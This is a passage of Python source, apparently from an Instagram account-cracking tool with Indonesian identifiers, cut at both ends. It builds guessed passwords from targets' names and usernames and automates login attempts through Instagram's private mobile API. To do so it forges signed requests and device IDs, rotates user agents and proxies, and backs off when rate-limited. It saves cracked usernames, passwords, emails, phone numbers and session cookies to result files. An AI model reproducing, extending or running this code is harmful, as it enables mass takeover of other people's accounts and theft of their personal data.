									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345']
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345']
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.V1,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.V2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.V3,username,sandi)
								elif 'empat' in method:
									shinkai.submit(self.V4,username,sandi)
								elif 'lima' in method:
									shinkai.submit(self.V5,username,sandi)
								elif 'enam' in method:
									shinkai.submit(self.V6,username,sandi)
								else:
									shinkai.submit(self.V1,username,sandi)
					except:
						pass
			print('\n')
			prints(Panel(f" {P2}Hasil {acakrich}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
		exit()
	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def encpwd(self,password):
		resp = ses.get("https://instagram.com/api/v1/web/accounts/login/ajax/")
		key_id = int(resp.headers.get("ig-set-password-encryption-web-key-id"))
		pub_key = resp.headers.get("ig-set-password-encryption-web-pub-key")
		version =resp.headers.get("ig-set-password-encryption-web-key-version")
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(
            password.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1,
                           key_id,
                           *list(struct.pack('<h', len(encrypted_key))),
                           *list(encrypted_key),
                           *list(cipher_tag),
                           *list(encrypted_password)])
		encrypted = base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_pw(self, pw, link):
		key_id = re.findall('{"key_id":"(.*?)"', str(link.replace("\\","")))[0]
		pub_key = re.findall('public_key\":\"(.*?)\",', str(link.replace("\\","")))[0]
		version = re.findall('version\":\"(\d+)\"}', str(link.replace("\\","")))[0]
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(pw.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1, int(key_id), *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
		base = base64.b64encode(encrypted).decode('utf-8')
		return f"#PWD_INSTAGRAM_BROWSER:{version}:{time}:{base}"
		
	def V1(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		gedz=HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1=gedz.split('|')[1]
		ven2=gedz.split('|')[2]
		giu1=HARIS["giu"]
		giu=giu1.split("||")
		ua=self.ua_sam_idin()
		ua=f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		IDIN = random.choice(["[green]","[yelllow]","[red]","[purple]"])
		prog.update(des,description=f"[bold white][ [bold green]SEDANG_CRACK V1 [bold white]] {IDIN}{str(loop)}[white]|[white]{len(internal)}[/] [white]IDIN-OK:-[bold green]{len(success)}[/] [white]IDIN-CP:-[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
							nomo, email = self.INFOdata(cookie)
							print("")
							Idin_Panel(Idin_gg(f"\r{P2}[{H2}✓{P2}]NAMA      : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME  : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD  : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT  : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT  : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}\n{P2}[{H2}✓{P2}]NOMOR     : {H2}{nomo}\n{P2}[{H2}✓{P2}]EMAIL     : {H2}{email}\n{P2}[{H2}✓{P2}]COOKIE    : {H2}{cookie}\n{P2}[{H2}✓{P2}]UA IDIN   : {N2}{ua}",style=f"bold green"))
						#	prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}\n{P2}[{H2}✓{P2}] Nomor     : {H2}{nomo}\n{P2}[{H2}✓{P2}] Email     : {H2}{email}\n{P2}[{H2}✓{P2}] Cookies   : {H2}{cookie}',title=f"{H2} IDIN|OK ",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2} IDIN|OK ",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						Idin_Panel(Idin_gg(f"\r{P2}[{K2}X{P2}]{P2}USERNAME      : {K2}{user}\n{P2}[{K2}X{P2}]{P2}PASSWORD      : {K2}{pw}\n{P2}[{K2}X{P2}]{P2}PENGIKUT      : {K2}{pengikut}\n{P2}[{K2}X{P2}]{P2}MENGIKUT      : {K2}{mengikut}\n{P2}[{K2}X{P2}]{P2}POSTINGAN     : {K2}{postingan}",style=f"bold yellow"))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
		
	def V2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		warna = random.choice([M, H, K, U, O,])
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		rr=random.randint
		ua=self.User_Ganet()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		IDIN = random.choice(["[green]","[yelllow]","[red]","[purple]"])
		prog.update(des,description=f"[bold white][ [bold green]SEDANG_CRACK V2 [bold white]] {IDIN}{str(loop)}[white]|[white]{len(internal)}[/] [white]IDIN-OK:-[bold green]{len(success)}[/] [white]IDIN-CP:-[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw=pw.replace(' ','+')
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=(respon.text)
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
							nomo, email = self.INFOdata(cookie)
							print("")
							Idin_Panel(Idin_gg(f"\r{P2}[{H2}✓{P2}]NAMA      : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME  : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD  : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT  : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT  : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}\n{P2}[{H2}✓{P2}]NOMOR     : {H2}{nomo}\n{P2}[{H2}✓{P2}]EMAIL     : {H2}{email}\n{P2}[{H2}✓{P2}]COOKIE    : {H2}{cookie}\n{P2}[{H2}✓{P2}]UA IDIN   : {N2}{ua}",style=f"bold green"))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						Idin_Panel(Idin_gg(f"\r{P2}[{K2}X{P2}]{P2}USERNAME      : {K2}{user}\n{P2}[{K2}X{P2}]{P2}PASSWORD      : {K2}{pw}\n{P2}[{K2}X{P2}]{P2}PENGIKUT      : {K2}{pengikut}\n{P2}[{K2}X{P2}]{P2}MENGIKUT      : {K2}{mengikut}\n{P2}[{K2}X{P2}]{P2}POSTINGAN     : {K2}{postingan}",style=f"bold yellow"))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
		
	def V3(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		warna = random.choice([M, H, K, U, O,])
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		rr=random.randint
		ua=self.ua_sam_idin()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		#KONTU = random.choice(["🥱","🔥"])
		IDIN = random.choice(["[green]","[yelllow]","[red]","[purple]"])
		prog.update(des,description=f"[bold white][ [bold green] BASRENG [bold white]] {IDIN}{str(loop)}[white]|[white]{len(internal)}[/] [white]IDIN-OK:-[bold green]{len(success)}[/] [white]IDIN-CP:-[bold yellow]{len(checkpoint)}[/]")
	#	prog.update(des,description=f"[{acakrich}✓[/]] proses [{acakrich}{str(loop)}/{len(internal)}[/]] OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw=pw.replace(' ','+')
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=(respon.text)
					logtemp+=1
					if "logged_in_user" in str(ncek) or "sessionid" in ses.cookies.get_dict() or "userId" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("\r                                       ")
							Idin_Panel(Idin_gg(f"\r{P2}[{H2}✓{P2}]NAMA      : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME  : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD  : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT  : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT  : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}",style=f"bold green"))
						#	tree = Tree(f"[bold green]{user}|{pw}[bold white]")
				#	s		tree.add(f'[bold greeen]{pengikut}|{mengikuti}[bold white]').add(f'[bold green]{ua}[bold white]')
						#	cetak(tree)
							#prints(panel(f"{P2}[{H2}✓{P2}] Private : {H2}{private}\n{P2}[{H2}✓{P2}] Verified : {H2}{verified}\n{P2}[{H2}✓{P2}] FbID : {H2}{fbid}\n{P2}[{H2}✓{P2}] Username : {H2}{user}\n{P2}[{H2}✓{P2}] Password : {H2}{pw}\n{P2}[{H2}✓{P2}] Biography : {H2}{bio}\n{P2}[{H2}✓{P2}] Email : {H2}{email}\n{P2}[{H2}✓{P2}] Phone : {H2}{Followers}\n{P2}[{H2}✓{P2}] Following : {H2}{mengikut}\n{P2}[{H2}✓{P2}] Feedpost : {H2}{postingan}\n{P2}[{H2}✓{P2}] Pictures : {H2}{pictures}\n{P2}[{H2}✓{P2}] Cookie : {H2}{cookie}",title=f"{H2} IDIN|OK ",width=80,padding=(0,4),style=""))
							#adit=f'\r[bold green]Nama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
						#	pepekXD = nel(adit, style='white',width=55)
							#print('\n')
							#cetak(nel(pepekXD,style='',title='\r[bold green] IDIN|OK [bold green]',width=55))
							open(f"stokig+.txt","a").write(f'USERNAME : {user}\nPASSWORD : {pw}\nPENGIKUT : {pengikut}\nPOSTINGAN : {postingan}\n')
					#		open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f"\r{P2}[{H2}✓{P2}] Private : {H2}{private}\n{P2}[{H2}✓{P2}] Verified : {H2}{verified}\n{P2}[{H2}✓{P2}] FbID : {H2}{fbid}\n{P2}[{H2}✓{P2}] Username : {H2}{user}\n{P2}[{H2}✓{P2}] Password : {H2}{pw}\n{P2}[{H2}✓{P2}] Biography : {H2}{bio}\n{P2}[{H2}✓{P2}] Email : {H2}{email}\n{P2}[{H2}✓{P2}] Phone : {H2}{Followers}\n{P2}[{H2}✓{P2}] Following : {H2}{mengikut}\n{P2}[{H2}✓{P2}] Feedpost : {H2}{postingan}\n{P2}[{H2}✓{P2}] Pictures : {H2}{pictures}\n{P2}[{H2}✓{P2}] Cookie : {H2}{cookie}",title=f"{H2} IDIN|OK ",width=80,padding=(0,4),style=""))
							prints("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("\r                                       ")
						Idin_Panel(Idin_gg(f"\r{P2}[{K2}X{P2}]{P2}USERNAME      : {K2}{user}\n{P2}[{K2}X{P2}]{P2}PASSWORD      : {K2}{pw}\n{P2}[{K2}X{P2}]{P2}PENGIKUT      : {K2}{pengikut}\n{P2}[{K2}X{P2}]{P2}MENGIKUT      : {K2}{mengikut}\n{P2}[{K2}X{P2}]{P2}POSTINGAN     : {K2}{postingan}",style=f"bold yellow"))
					#	tree = Tree(f"[bold yellow]{user}|{pw}[bold white]")
				#		tree.add(f'[bold yellow]{pengikut}|{mengikuti}[bold white]')
					#	cetak(tree)
						#adit=f'\r[yellow]Nama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
						#pepekXD = nel(adit, style='white',width=55)
						#print('\n')
					#	cetak(nel(pepekXD,style='', title='\r[bold yellow] IDIN|CP [bold yellow]',width=55))
						open(f"StokCp+.txt.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
		loop+=1
		
	def V4(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		prx=random.choice(prox)
		xxx={"http": f"socks4://{prx}"}
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		ua=self.ua_sam_idin()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		IDIN = random.choice(["[green]","[yelllow]","[red]","[purple]"])
		prog.update(des,description=f"{P2}[{H2}STABIL{P2}] {P2}[{B2}{str(loop)}{P2}] | {P2}[{H2}{len(internal)}{P2}] {H2}{len(success)} {P2}| {K2}{len(checkpoint)}")
		#prog.update(des,description=f"[bold white][ [bold green]SEDANG_CRACK V4 [bold white]] {IDIN}{str(loop)}[white]|[white]{len(internal)}[/] [white]IDIN-OK:-[bold green]{len(success)}[/] [white]IDIN-CP:-[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						try:
							print("")
							print(f"\n{P} [ NAMA ] : {HI}{user} {P}<=> {HI}SUKSES🔥\n{P} [ PASSWORD ] : {HI}{pw} {P}<=> {HI}SUKSES🔥\n{P} [ PENGIKUT ] : {HI}{pengikut} {P}<=> {HI}SUKSES🔥\n{P} [ MENGIKUTI ] : {HI}{mengikut} {P}<=> {HI}SUKSES🔥\n{P} [ POSTINGAN ] : {HI}{postingan} {P}<=> {HI}SUKSES🔥")
							#Idin_Panel(Idin_gg(f"\r{P2}[{H2}✓{P2}]NAMA      : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME  : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD  : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT  : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT  : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}",style=f"bold green"))
					#		prints(Panel(f'\r{P2}[{H2}✓{P2}]NAMA : {H2}{nama}\n{P2}[{H2}✓{P2}]USERNAME : {H2}{user}\n{P2}[{H2}✓{P2}]PASSWORD : {H2}{pw}\n{P2}[{H2}✓{P2}]PENGIKUT : {H2}{pengikut}\n{P2}[{H2}✓{P2}]MENGIKUT : {H2}{mengikut}\n{P2}[{H2}✓{P2}]POSTINGAN : {H2}{postingan}',title=f" {H2}IDIN|OK ",width=80,padding=(0,4),style=f"bold green"))
							#prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f" {H2}IDIN|OK ",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						print(f"\n{P} [ NAMA ] : {M}{user} {P}<=> {K}CHECKPOINT💥\n{P} [ PASSWORD ] : {M}{pw} {P}<=> {K}CHECKPOINT💥\n{P} [ PENGIKUT ] : {M}{pengikut} {P}<=> {K}CHECKPOINT💥\n{P} [ MENGIKUTI ] : {M}{mengikut} {P}<=> {K}CHECKPOINT💥")
						#Idin_Panel(Idin_gg(f"\r{P2}[{K2}X{P2}]{P2}USERNAME      : {K2}{user}\n{P2}[{K2}X{P2}]{P2}PASSWORD      : {K2}{pw}\n{P2}[{K2}X{P2}]{P2}PENGIKUT      : {K2}{pengikut}\n{P2}[{K2}X{P2}]{P2}MENGIKUT      : {K2}{mengikut}\n{P2}[{K2}X{P2}]{P2}POSTINGAN     : {K2}{postingan}",style=f"bold yellow"))
